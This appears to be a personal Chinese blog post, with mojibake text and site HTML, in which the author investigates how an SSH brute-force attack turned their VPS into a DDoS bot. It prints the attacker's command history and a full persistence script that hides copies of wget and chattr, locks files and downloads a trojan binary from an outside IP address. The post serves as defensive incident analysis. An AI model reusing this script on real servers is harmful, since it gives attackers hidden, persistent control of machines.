<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹ | To change is to be better to change often is to change perfect</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="VPSè¿è¥çˆ†ç ´ç«¯å£firewalldè„šæœ¬å°å­" />
  
  
    <meta name="google-site-verification" content="zeeMq378QFdIk20wn4KhRFwp7IhLaosjf7Kf7o9Zcfs" />
  
  
  
  <meta name="description" content="æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹ ä¸ä¹…å‰è¯»äº†ä¸€ç¯‡é»‘å®¢æ•…äº‹ï¼ˆ é«˜æ‰‹å¯¹å†³ â€“ åšå®¢æœåŠ¡å™¨è¢«é»‘çš„æ•…äº‹ï¼‰ï¼Œè¯»å®Œæ­¤æ–‡åï¼Œæ‰æ„è¯†åˆ°æˆ‘çš„æœºå™¨æ˜¯å¤„äºè£¸å¥”çŠ¶æ€ï¼Œä¾¿é¥¶æœ‰å…´è‡´åœ°å»æœåŠ¡å™¨æ£€æŸ¥äº†ä¸€ä¸‹æ—¥å¿—ã€‚å‘ç°è¿˜çœŸæœ‰äººåœ¨å°è¯•å¯¹æˆ‘çš„æœºå™¨è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆä¸€ä¸‹ç®€ç§°çˆ†ç ´ï¼‰ï¼Œè€Œä¸”æ”»åŠ¿è¿˜æŒºçŒ›ï¼Œå½“å¤©å°±æœ‰1w+çš„æš´åŠ›å°è¯•ï¼ä½†æ˜¯å½“æ—¶å¹¶æ²¡æœ‰ç‰¹åˆ«å»åœ¨æ„ï¼Œè¢«é»‘è¿™ç§äº‹æƒ…åº”è¯¥ä¸ä¼šå‘ç”Ÿçš„â€¦â€¦å§â€¦â€¦ åªæ˜¯ï¼Œå‡ å¤©ä¹‹åçš„æŸä¸€å¤©ï¼ˆ2æœˆ3å·ï¼‰æ·±å¤œï¼Œè¶´åœ¨åºŠä¸Šä¼‘é—²çš„çœ‹é‚®ä»¶æ—¶ï¼Œæ”¶">
<meta name="keywords" content="VPS,è¿è¥,çˆ†ç ´ç«¯å£,firewalld,è„šæœ¬å°å­">
<meta property="og:type" content="article">
<meta property="og:title" content="æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹">
<meta property="og:url" content="http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/index.html">
<meta property="og:site_name" content="To change is to be better to change often is to change perfect">
<meta property="og:description" content="æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹ ä¸ä¹…å‰è¯»äº†ä¸€ç¯‡é»‘å®¢æ•…äº‹ï¼ˆ é«˜æ‰‹å¯¹å†³ â€“ åšå®¢æœåŠ¡å™¨è¢«é»‘çš„æ•…äº‹ï¼‰ï¼Œè¯»å®Œæ­¤æ–‡åï¼Œæ‰æ„è¯†åˆ°æˆ‘çš„æœºå™¨æ˜¯å¤„äºè£¸å¥”çŠ¶æ€ï¼Œä¾¿é¥¶æœ‰å…´è‡´åœ°å»æœåŠ¡å™¨æ£€æŸ¥äº†ä¸€ä¸‹æ—¥å¿—ã€‚å‘ç°è¿˜çœŸæœ‰äººåœ¨å°è¯•å¯¹æˆ‘çš„æœºå™¨è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆä¸€ä¸‹ç®€ç§°çˆ†ç ´ï¼‰ï¼Œè€Œä¸”æ”»åŠ¿è¿˜æŒºçŒ›ï¼Œå½“å¤©å°±æœ‰1w+çš„æš´åŠ›å°è¯•ï¼ä½†æ˜¯å½“æ—¶å¹¶æ²¡æœ‰ç‰¹åˆ«å»åœ¨æ„ï¼Œè¢«é»‘è¿™ç§äº‹æƒ…åº”è¯¥ä¸ä¼šå‘ç”Ÿçš„â€¦â€¦å§â€¦â€¦ åªæ˜¯ï¼Œå‡ å¤©ä¹‹åçš„æŸä¸€å¤©ï¼ˆ2æœˆ3å·ï¼‰æ·±å¤œï¼Œè¶´åœ¨åºŠä¸Šä¼‘é—²çš„çœ‹é‚®ä»¶æ—¶ï¼Œæ”¶">
<meta property="og:image" content="http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/1.jpg">
<meta property="og:image" content="http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/2.jpg">
<meta property="og:image" content="http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/3.jpg">
<meta property="og:image" content="http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/4.png">
<meta property="og:image" content="http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/5.png">
<meta property="og:image" content="http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/6.png">
<meta property="og:image" content="http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/7.jpg">
<meta property="og:updated_time" content="2018-03-30T07:09:32.131Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹">
<meta name="twitter:description" content="æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹ ä¸ä¹…å‰è¯»äº†ä¸€ç¯‡é»‘å®¢æ•…äº‹ï¼ˆ é«˜æ‰‹å¯¹å†³ â€“ åšå®¢æœåŠ¡å™¨è¢«é»‘çš„æ•…äº‹ï¼‰ï¼Œè¯»å®Œæ­¤æ–‡åï¼Œæ‰æ„è¯†åˆ°æˆ‘çš„æœºå™¨æ˜¯å¤„äºè£¸å¥”çŠ¶æ€ï¼Œä¾¿é¥¶æœ‰å…´è‡´åœ°å»æœåŠ¡å™¨æ£€æŸ¥äº†ä¸€ä¸‹æ—¥å¿—ã€‚å‘ç°è¿˜çœŸæœ‰äººåœ¨å°è¯•å¯¹æˆ‘çš„æœºå™¨è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆä¸€ä¸‹ç®€ç§°çˆ†ç ´ï¼‰ï¼Œè€Œä¸”æ”»åŠ¿è¿˜æŒºçŒ›ï¼Œå½“å¤©å°±æœ‰1w+çš„æš´åŠ›å°è¯•ï¼ä½†æ˜¯å½“æ—¶å¹¶æ²¡æœ‰ç‰¹åˆ«å»åœ¨æ„ï¼Œè¢«é»‘è¿™ç§äº‹æƒ…åº”è¯¥ä¸ä¼šå‘ç”Ÿçš„â€¦â€¦å§â€¦â€¦ åªæ˜¯ï¼Œå‡ å¤©ä¹‹åçš„æŸä¸€å¤©ï¼ˆ2æœˆ3å·ï¼‰æ·±å¤œï¼Œè¶´åœ¨åºŠä¸Šä¼‘é—²çš„çœ‹é‚®ä»¶æ—¶ï¼Œæ”¶">
<meta name="twitter:image" content="http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/1.jpg">
  
    <link rel="alternate" href="/atom.xml" title="To change is to be better to change often is to change perfect" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>
  <script src="/js/bootstrap.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    <link rel="stylesheet" href="/css/dialog.css">
  

  

  
    <link rel="stylesheet" href="/css/header-post.css" >
  

  
  
  

</head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  <div id="container">
    <div id="wrap">
      
        

<header>

    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
        <div class="navbar-inner">
          
          <div class="container"> 
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>

            
              <a class="brand" style="
                 margin-top: 0px;"  
                href="#" data-toggle="modal" data-target="#myModal" >
                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
              </a>
            
            
            <div class="navbar-collapse collapse">
              <ul class="hnav navbar-nav">
                
                  <li> <a class="main-nav-link" href="/">Startseite</a> </li>
                
                  <li> <a class="main-nav-link" href="/archives">Archive</a> </li>
                
                  <li> <a class="main-nav-link" href="/categories">about themes</a> </li>
                
                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
                
                  <li> <a class="main-nav-link" href="/about">About</a> </li>
                
                  <li> <a class="main-nav-link" href="/book">ğŸ““</a> </li>
                
                  <li><div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Schreib etwas..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'BeitrÃ¤ge',
            PAGES: 'Seiten',
            CATEGORIES: 'Kategorien',
            TAGS: 'Tags',
            UNTITLED: '(Unbenannt)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div></li>
            </div>
          </div>
                
      </div>
    </div>

</header>



      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/" class="article-date">
	  <time datetime="2018-03-30T06:59:34.000Z" itemprop="datePublished">2018-03-30</time>
	</a>

      
      
	<a class="article-views">
	<span id="busuanzi_container_page_pv">
		PV:<span id="busuanzi_value_page_pv"></span>
	</span>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹</p>
<p>ä¸ä¹…å‰è¯»äº†ä¸€ç¯‡é»‘å®¢æ•…äº‹ï¼ˆ é«˜æ‰‹å¯¹å†³ â€“ åšå®¢æœåŠ¡å™¨è¢«é»‘çš„æ•…äº‹ï¼‰ï¼Œè¯»å®Œæ­¤æ–‡åï¼Œæ‰æ„è¯†åˆ°æˆ‘çš„æœºå™¨æ˜¯å¤„äºè£¸å¥”çŠ¶æ€ï¼Œä¾¿é¥¶æœ‰å…´è‡´åœ°å»æœåŠ¡å™¨æ£€æŸ¥äº†ä¸€ä¸‹æ—¥å¿—ã€‚å‘ç°è¿˜çœŸæœ‰äººåœ¨å°è¯•å¯¹æˆ‘çš„æœºå™¨è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆä¸€ä¸‹ç®€ç§°çˆ†ç ´ï¼‰ï¼Œè€Œä¸”æ”»åŠ¿è¿˜æŒºçŒ›ï¼Œå½“å¤©å°±æœ‰1w+çš„æš´åŠ›å°è¯•ï¼ä½†æ˜¯å½“æ—¶å¹¶æ²¡æœ‰ç‰¹åˆ«å»åœ¨æ„ï¼Œè¢«é»‘è¿™ç§äº‹æƒ…åº”è¯¥ä¸ä¼šå‘ç”Ÿçš„â€¦â€¦å§â€¦â€¦</p>
<p>åªæ˜¯ï¼Œå‡ å¤©ä¹‹åçš„æŸä¸€å¤©ï¼ˆ2æœˆ3å·ï¼‰æ·±å¤œï¼Œè¶´åœ¨åºŠä¸Šä¼‘é—²çš„çœ‹é‚®ä»¶æ—¶ï¼Œæ”¶åˆ°äº†DOåœ¨1æœˆ29å·å‘çš„è­¦å‘Šé‚®ä»¶ï¼ˆDOï¼šDigital Ocean, ä¸€ä¸ªvpsä¸»æœºæä¾›å•†ï¼Œè¿™ä¸ªåšå®¢å°±æ˜¯æ¶è®¾åœ¨æˆ‘åœ¨DOçš„vpsä¸Šï¼‰ï¼š</p>
<p>We are sorry to report that we have detected what appears to be a large flood of traffic from one or more of your servers that is disrupting the normal traffic flow for other users.</p>
<p>To prevent this traffic from causing further disruption, we have disabled the networking interface on the server or servers involvedâ€¦</p>
<p>ä»€ä¹ˆæƒ…å†µï¼æˆ‘çš„æœåŠ¡å™¨è¢«é»‘äº†ï¼ï¼ï¼ŸDOæŠŠæˆ‘çš„æœåŠ¡å°äº†ï¼ï¼ï¼Ÿç«‹é©¬æ‰“å¼€æµè§ˆå™¨è®¿é—®æˆ‘çš„åšå®¢ä¸»é¡µï¼Œæœç„¶æŒ‚äº†ã€‚ç„¶åå°è¯•sshç™»å½•åˆ°ä¸»æœºï¼Œè¿æ¥ä¸ä¸Šï¼Œæœç„¶ä¸»æœºè¢«å°äº†ï¼è€Œä¸”è¿™é‚®ä»¶æ˜¯äº”å¤©å‰å‘çš„ï¼Œæˆ‘ç°åœ¨æ‰çŸ¥é“ï¼å“å¾—å½“æ—¶æˆ‘çš„è¡¨æƒ…æ˜¯è¿™æ ·çš„ï¼š</p>
<img src="/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/1.jpg">
<p>å¯»æ‰¾çº¿ç´¢<br>ç¬¬äºŒå¤©èµ·åºŠä¹‹åï¼Œç«‹é©¬è·‘åˆ°è‡ªä¹ å®¤è¿›å…¥å¿˜æˆ‘æ¨¡å¼ï¼Œå¼€å§‹è¿½æŸ¥åŸå› ï¼</p>
<p>æœåŠ¡å™¨ç½‘ç»œè¢«ç¦ï¼Œæ²¡æ³•sshç™»å½•ã€‚å¹¸å¥½ï¼Œ DO æä¾›äº†Web consoleæ¥å£ï¼Œå¯ä»¥é€šè¿‡Webç•Œé¢æ¥ç™»å½•æœåŠ¡å™¨ã€‚</p>
<p>â€œDOæŠŠæˆ‘æœç½‘ç»œå°ç¦äº†ï¼Œé‚£è´¼ç°åœ¨åº”è¯¥æ— æ³•æ§åˆ¶æˆ‘çš„æœåŠ¡å™¨â€ï¼Œå¿ƒé‡Œå†ä¸€æ¬¡æš—æƒ³ç€ï¼Œâ€œç°åœ¨æš‚æ—¶æ— éœ€ä¿®æ”¹å¯†ç æ¥é˜²æ­¢ä¸»æœºè¢«å†æ¬¡æ§åˆ¶ï¼Œå…ˆå…ˆæ‰¾å‡ºé—®é¢˜æ‰€åœ¨å§ã€‚â€</p>
<p>å†æ¬¡æ‰“å¼€é‚®ä»¶ï¼Œè§‚å¯ŸDOæä¾›çš„æŠ¥è­¦ä¿¡æ¯ï¼š</p>
<p>We are sorry to report that we have detected what appears to be a large flood of traffic from one or more of your servers that is disrupting the normal traffic flow for other users.</p>
<p>To prevent this traffic from causing further disruption, we have disabled the networking interface on the server or servers involvedâ€¦</p>
<p>â€œéš¾é“æœåŠ¡å™¨è¢«åŠ«æŒä½œä¸ºè‚‰é¸¡æ¥æ”»å‡»å…¶å®ƒçš„ç½‘ç»œäº†ï¼ï¼Ÿâ€ï¼Œé‚£æ˜¯ä¸€å¤´é›¾æ°´å•Šï¼Œå®Œå…¨ä¸æ¸…æ¥šæ”»å‡»è€…ç©¶ç«Ÿåˆ©ç”¨æˆ‘æœåšäº†ä»€ä¹ˆäº‹æƒ…ï¼Œçœ‹èµ·æ¥å¥½åƒæ˜¯è¢«å½“è‚‰é¸¡äº†å“ â•®(â•¯â–½â•°)â•­ã€‚</p>
<p>æ‰€ä»¥æ¥ä¸‹æ¥ç†æ‰€å½“ç„¶çš„å»æŸ¥çœ‹æœ‰é—®é¢˜çš„è¿›ç¨‹äº†ã€‚</p>
<p>æ—¢ç„¶æ˜¯traffic floodï¼Œé‚£å°±å…ˆä»ç½‘ç»œæ£€æŸ¥èµ·ã€‚</p>
<p>$ sudo ss -p<br>State       Recv-Q Send-Q   Local Address:Port       Peer Address:Port<br>SYN-SENT    0      4            127.0.0.1:36512      183.60.149.202:43200<br>users:((â€œicnankerâ€,14519,4))<br>â€¦<br>ä¸å‡ºæ‰€æ–™æœç„¶çœ‹åˆ°äº†ä¸€ä¸ªå¾ˆå¯ç–‘çš„ç¨‹åºï¼šicnankerï¼Œå®ƒåœ¨ä¸åœçš„å°è¯•å¾€183.60.149.202:43200å‘é€tcp synåŒ…ï¼ç«‹é©¬æœè¿™ä¸ªIPçš„ä¿¡æ¯ï¼Œåªå‘ç°è¿™æ˜¯ä¸œèçš„ä¸€ä¸ªIPã€‚é‚£ç»§ç»­å§ï¼Œå…ˆæ‰¾å‡ºæ‰€æœ‰æœ‰é—®é¢˜çš„è¿›ç¨‹å†è¯´ã€‚</p>
<p>æœç„¶åœ¨è¿›ç¨‹åˆ—è¡¨ä¸­æ‰¾åˆ°äº†ä¸‰ä¸ªå¾ˆå¯ç–‘çš„è¿›ç¨‹ï¼š</p>
<p>$ ps aux<br>(â€¦)<br>root     13648  0.0  0.1 23656   556 ?        Ss    Jan28   0:43 /etc/init.d/apache2.sh<br>root     14519  0.0  0.2 85872  1208 ?        S     Jan28   23:41 /usr/bin/icnanker<br>root     26595  0.0  0.2 61364  1224 ?        S     Jan28   0:00 /usr/bin/.sshd<br>(â€¦)<br>ç¬¬ä¸€ï¼Œæˆ‘æ²¡æœ‰è£…apacheï¼Œapache2.shè¿™æ ·çš„åå­—å®åœ¨æ˜¯å¤ªå¯ç–‘äº†ã€‚</p>
<p>ç¬¬äºŒï¼Œ.sshdè¿™ä¸ªè¿›ç¨‹çš„åå­—æ›´å¯ç–‘ï¼Œsshdå®ˆæŠ¤è¿›ç¨‹æ˜¯sshdï¼Œä¼ªè£…å¾—å¤ªä¸åƒäº†ã€‚</p>
<p>ç¬¬ä¸‰ï¼Œåªæœ‰è¿™ä¸‰ä¸ªè¿›ç¨‹éƒ½æ˜¯åœ¨Jan28å¯åŠ¨çš„ï¼Œä¹Ÿå°±æ˜¯1æœˆ28å·ï¼Œè¿™è®©æˆ‘è”æƒ³åˆ°29å·é€ æˆçš„traffic floodã€‚è‚¯å®šæœ‰é—®é¢˜ã€‚</p>
<p>æ¥ç€ä¸‹æ„è¯†çš„å»ç¿»é˜…ç™»å½•æ—¥å¿—ï¼š</p>
<h1 id="grep-â€œAcceptedâ€-var-log-auth-log-1"><a href="#grep-â€œAcceptedâ€-var-log-auth-log-1" class="headerlink" title="grep â€œAcceptedâ€ /var/log/auth.log.1"></a>grep â€œAcceptedâ€ /var/log/auth.log.1</h1><p>(â€¦)<br>Jan 26 16:55:49 mon sshd[13955]: Accepted password for root from 61.160.247.8 port 1604 ssh2<br>Jan 28 17:12:03 mon sshd[30407]: Accepted password for root from 61.166.50.23 port 3343 ssh2<br>(â€¦)</p>
<h1 id="grep-â€œJan-2-5-8-sshd-Failedâ€-var-log-auth-log-1-wc"><a href="#grep-â€œJan-2-5-8-sshd-Failedâ€-var-log-auth-log-1-wc" class="headerlink" title="grep â€œJan 2[5-8] .sshd.Failedâ€ /var/log/auth.log.1 | wc"></a>grep â€œJan 2[5-8] .<em>sshd.</em>Failedâ€ /var/log/auth.log.1 | wc</h1><p>  21806  355851 2333557<br>ï¼ï¼ï¼ï¼</p>
<p>Jan 26å’Œ Jan 28éƒ½æœ‰äººåœ¨æˆ‘çš„æœºå™¨ä¸Šç™»å½•è¿‡rootè´¦å·ï¼Ipæ¥æºå‘ç°åˆ†åˆ«æ˜¯äº‘å—å’Œæ±Ÿè‹çš„ï¼Œä¹Ÿæ˜¯éå¸¸è¯¡å¼‚ã€‚æ¥ç€è®©æˆ‘æ›´åƒæƒŠçš„æ˜¯ä»Jan 25åˆ°Feb 28ï¼Œå…±æœ‰2w+çš„æš´ç ´å°è¯•ï¼</p>
<p>åœ¨çœ‹åˆ°è¿™äº›ç»“æœçš„ç¬é—´å…¶å®æˆ‘å°±æ˜ç™½äº†ä¸ºä½•æˆ‘ä¼šè¢«æ”»ç ´â€”â€”å› ä¸ºæˆ‘çš„å¯†ç è®¾ç½®å¾—éå¸¸éå¸¸ç®€å•ï¼Œç®€å•åˆ°å’Œâ€œ123456â€è¿™æ ·çš„å¯†ç å·®ä¸å¤šã€‚è¿™ä¸ªæ—¶å€™æˆ‘çš„è¡¨æƒ…æ˜¯è¿™æ ·çš„ï¼š<br><img src="/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/2.jpg"></p>
<p>ç«‹é©¬åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼ŒæŸ¥çœ‹rootå‘½ä»¤è®°å½•ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è¿½è¸ªåˆ°è¿™ä¸ªå®¶ä¼™åœ¨æˆ‘æœºå™¨ä¸Šåšè¿‡ä»€ä¹ˆï¼ŒåŒæ—¶åœ¨å¿ƒé‡Œåƒä¸Šå¸ç¥ˆç¥·å¸Œæœ›ä»–æ²¡æ“¦å»è„šå°ã€‚</p>
<h1 id="history"><a href="#history" class="headerlink" title="history"></a>history</h1><p>(â€¦)<br>    4  cp /usr/bin/wget /usr/bin/vget<br>    5  cp /usr/bin/chattr /usr/bin/lockr<br>    6  chmod 0 /usr/bin/chattr;chmod 0 /usr/bin/wget<br>    7  lockr +i /usr/bin/chattr;lockr +i /usr/bin/wget<br>    8  chmod 0755 /usr/bin/vget;chmod 0755 /usr/bin/lockr<br>    9  vget <a href="http://183.60.149.202:8080/apache2.sh" target="_blank" rel="noopener">http://183.60.149.202:8080/apache2.sh</a><br>   10  mv /root/apache2.sh /etc/init.d/apache2.sh<br>   11  chmod 0755 /etc/init.d/apache2.sh<br>   12  nohup sh /etc/init.d/apache2.sh &gt;/dev/null 2&gt;&amp;1 &amp;<br>   13  lockr +i /etc/init.d/apache2.sh<br>   14  vi /etc/rc.local<br>   15  lockr +i /etc/rc.local<br>   16  less /etc/init.d/apache2.sh<br>æ„Ÿæ…¨ä¸‡åƒï¼Œä¸‡åƒæ„Ÿæ…¨ï¼Œâ€œè¿˜å¥½ï¼Œè¿™ä¸ªå‚»é€¼æ²¡æœ‰æ“¦å»è„šå°â€ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆã€‚ã€‚</p>
<p>åšæŠ±æ‹³çŠ¶ï¼Œç«™èµ·ï¼Œå‡ºè‡ªä¹ å®¤ï¼Œæ¥å¼€æ°´ï¼Œå›æ¥ï¼Œç»§ç»­ï¼</p>
<p>â€œæˆ‘éœ€è¦çŸ¥é“ï¼Œè¿™å®¶ä¼™ç©¶ç«Ÿå¯¹æˆ‘çš„æœºå™¨å¹²äº†äº›ä»€ä¹ˆï¼â€</p>
<p>ä»ä¸Šé¢çš„å‘½ä»¤è®°å½•æ¥çœ‹ï¼Œ/etc/init.d/apache2.shè¿™ä¸ªè„šæœ¬æœ‰å¾ˆå¤§çš„å«Œç–‘ï¼ŒæŸ¥çœ‹è„šæœ¬å†…å®¹ï¼š</p>
<h1 id="cat-etc-init-d-apache2-sh"><a href="#cat-etc-init-d-apache2-sh" class="headerlink" title="cat /etc/init.d/apache2.sh"></a>cat /etc/init.d/apache2.sh</h1><p>#!/bin/sh<br>while [ 1 -gt 0 ];do<br>Get=â€/usr/bin/vgetâ€<br>Lok=â€/usr/bin/lockrâ€<br>Bak=â€/usr/bin/.filebakâ€<br>hosts=â€/etc/hosts.bakâ€<br>File=â€/usr/bin/icnankerâ€<br>if [ ! -f  â€œ$hostsâ€ ];then<br>    cp -f /etc/hosts.deny /etc/hosts.bak<br>    lockr +i /etc/hosts.bak<br>fi<br>if [ ! -f  â€œ$Lokâ€ ];then<br>    cp -f /usr/bin/chattr /usr/bin/lockr<br>    cp -f /usr/bin/chattr /usr/bin/.locks<br>    cp -f /usr/bin/.locks /usr/bin/lockr<br>    chmod 0755 /usr/bin/lockr<br>    chmod 0755 /usr/bin/.locks<br>    lockr +i /usr/bin/lockr<br>    lockr +i /usr/bin/.locks<br>fi<br>if [ ! -f  â€œ$Getâ€ ];then<br>    cp -f /usr/bin/wget /usr/bin/vget<br>    cp -f /usr/bin/wget /usr/bin/.bget<br>    cp -f /usr/bin/.bget /usr/bin/vget<br>    chmod 0755 /usr/bin/vget<br>    chmod 0755 /usr/bin/.bget<br>    lockr +i /usr/bin/vget<br>    lockr +i /usr/bin/.bget<br>fi<br>Exist=<code>ss|grep 183.60.149.202:43200|grep -v &quot;grep&quot;</code><br>if [ -z â€œ$Existâ€ ];then<br>    lockr -i /usr/bin/.filebak<br>    lockr -i /usr/bin/icnanker<br>    chmod 0755 /usr/bin/.filebak<br>    chmod 0755 /usr/bin/icnanker<br>    if [ ! -f  â€œ$Fileâ€ ];then<br>        if [ ! -f  â€œ$Bakâ€ ];then<br>            rm -f /etc/init.d/icnanker;rm -f /etc/init.d/icnanker.1<br>            vget -P /etc/init.d/ vget <a href="http://183.60.149.202:8080/icnanker" target="_blank" rel="noopener">http://183.60.149.202:8080/icnanker</a><br>            mv /etc/init.d/icnanker /usr/bin/icnanker<br>        else<br>            cp -f /usr/bin/.filebak /usr/bin/icnanker<br>        fi<br>    fi<br>    pkill icnanker;pkill icnanker<br>    chmod 0755 /usr/bin/icnanker<br>    lockr +i /usr/bin/icnanker<br>    /usr/bin/icnanker<br>fi<br>if [ ! -f  â€œ$Bakâ€ ];then<br>    cp -f /usr/bin/icnanker /usr/bin/.filebak<br>    chmod 0755 /usr/bin/.filebak<br>    lockr +i /usr/bin/.filebak<br>fi<br>chmod 0 /usr/bin/wget<br>lockr +i /usr/bin/wget<br>chmod 0 /usr/bin/chattr<br>lockr +i /usr/bin/chattr<br>chmod 0 /usr/lib/sftp-server<br>lockr +i /usr/lib/sftp-server<br>lockr -i /etc/hosts.deny;cp /etc/hosts.bak /etc/hosts.deny;lockr +i /etc/hosts.deny<br>sleep 30<br>done<br>ä»”ç»†çœ‹ä¸‹æ¥ï¼Œè¿™åº”è¯¥æ˜¯â€icnankerâ€çš„åå°å®ˆæŠ¤ç¨‹åºï¼Œç¡®ä¿â€icnankerâ€ä¸€ç›´åœ¨è¿è¡Œã€‚</p>
<p>é‚£â€icnankerâ€ç©¶ç«Ÿæ˜¯å¹²ä»€ä¹ˆçš„ï¼Œç©¶ç«Ÿåœ¨æˆ‘çš„ç³»ç»Ÿä¸Šå¹²äº†ä»€ä¹ˆï¼ŒæœåŠ¡å™¨è¿˜æœ‰ä»€ä¹ˆå…¶ä»–çš„â€œåå®¶ä¼™â€åœ¨ï¼Ÿ</p>
<p>å°è¯•æ‰“å¼€â€œicnankerâ€ï¼Œçœ‹çœ‹â€œicnankerâ€çš„å†…å®¹ï¼Œå‘ç°å®ƒæ˜¯äºŒè¿›åˆ¶çš„ï¼Œæ— æ³•æŸ¥çœ‹è¯¥æœ¨é©¬çš„å…·ä½“ä½œç”¨ã€‚ä½†æ˜¯æ ¹æ® DO çš„æ£€æµ‹ã€apache2.shè„šæœ¬å†…å®¹ä»¥åŠâ€icnankerâ€ä¸€ç›´åœ¨è¿›è¡Œç€çš„å¤§é‡tcpé“¾æ¥å°è¯•å¯ä»¥çœ‹å‡ºï¼Œä¼¼ä¹è¿™æ˜¯ä¸€ä¸ªDDoSæœ¨é©¬ï¼Œsyn floodã€‚</p>
